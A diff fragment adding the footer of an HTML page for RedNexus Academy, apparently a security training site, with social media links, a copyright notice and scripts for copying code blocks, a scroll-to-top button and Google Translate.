+                <a href="https://wa.me/201003425890" class="text-[#25D366] hover:opacity-80" aria-label="WhatsApp" target="_blank" rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"></path></svg></a>
+                <a href="https://www.facebook.com/RedNexusAcademy/" class="text-[#1877F2] hover:opacity-80" aria-label="Facebook" target="_blank" rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg></a>
+                <a href="https://x.com/rednexusacademy" class="text-[#1DA1F2] hover:opacity-80" aria-label="Twitter" target="_blank" rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a>
+                <a href="https://hossamshady.medium.com/" class="text-white hover:opacity-80" aria-label="Medium" target="_blank" rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 32v448h448V32H0zm372.2 106.1l-24 23c-2.1 1.6-3.1 4.2-2.7 6.7v169.3c-.4 2.6.6 5.2 2.7 6.7l23.5 23v5.1h-118V367l24.3-23.6c2.4-2.4 2.4-3.1 2.4-6.7V199.8l-67.6 171.6h-9.1L125 199.8v115c-.7 4.8 1 9.7 4.4 13.2l31.6 38.3v5.1H71.2v-5.1l31.6-38.3c3.4-3.5 4.9-8.4 4.1-13.2v-133c.4-3.7-1-7.3-3.8-9.8L75 138.1V133h87.3l67.4 148L289 133.1h83.2v5z"></path></svg></a>
+                <a href="mailto:support@rednexus.academy" class="text-[#D14836] hover:opacity-80" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a>
+            </div>
+            <p class="text-sm mt-2 text-gray-400 text-center">
+                © 2025 RedNexus® Institute.<br>
+                All course titles on this website are trademarks of RedNexus Institute.
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        // Copy Code Functionality
+        function copyCode(button) {
+            const container = button.closest('.code-block-wrapper');
+            let codeText = '';
+            
+            // Try to find code content
+            const prompts = container.querySelectorAll('.terminal-prompt');
+            const outputs = container.querySelectorAll('.terminal-output');
+            
+            // Construct text to copy
+            prompts.forEach(p => {
+                const promptContent = window.getComputedStyle(p, '::before').content.replace(/['"]/g, '');
+                codeText += promptContent + p.innerText + '\n';
+            });
+            
+            if(prompts.length === 0) {
+                 // Fallback for non-terminal code blocks
+                 codeText = container.innerText.replace('Copy', '').trim();
+            }
+
+            // Fallback for simple copy
+            if(!codeText) {
+                codeText = container.innerText;
+            }
+
+            // Create temporary textarea
+            const textarea = document.createElement('textarea');
+            textarea.value = codeText;
+            document.body.appendChild(textarea);
+            textarea.select();
+            
+            try {
+                document.execCommand('copy');
+                const originalText = button.innerText;
+                button.innerText = 'Copied!';
+                button.classList.add('copied');
+                
+                setTimeout(() => {
+                    button.innerText = originalText;
+                    button.classList.remove('copied');
+                }, 2000);
+            } catch (err) {
+                console.error('Failed to copy text', err);
+            }
+            
+            document.body.removeChild(textarea);
+        }
+
+        // Scroll to Top Button Logic
+        const scrollToTopBtn = document.getElementById("scrollToTopBtn");
+        
+        window.addEventListener("scroll", () => {
+            if (window.scrollY > 300) {
+                scrollToTopBtn.classList.remove("opacity-0", "pointer-events-none");
+            } else {
+                scrollToTopBtn.classList.add("opacity-0", "pointer-events-none");
+            }
+        });
+
+        scrollToTopBtn.addEventListener("click", () => {
+            window.scrollTo({
+                top: 0,
+                behavior: "smooth"
+            });
+        });
+
+        // Google Translate Init
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en',
+                includedLanguages: 'ar,en', // Only English and Arabic
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+                autoDisplay: false
+            }, 'google_translate_element');
+        }
+
+        // Apply 'notranslate' to code blocks to prevent translation of technical commands
+        document.addEventListener('DOMContentLoaded', () => {
+            // Select code containers, prompts, outputs, and any element using the code font
+            const techElements = document.querySelectorAll('.code-font, .terminal-prompt, .terminal-output, pre, code, .bg-slate-900');
+            techElements.forEach(el => {
+                el.classList.add('notranslate');
+                el.setAttribute('translate', 'no');
+            });
+        });
+    </script>
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</body>
+</html>
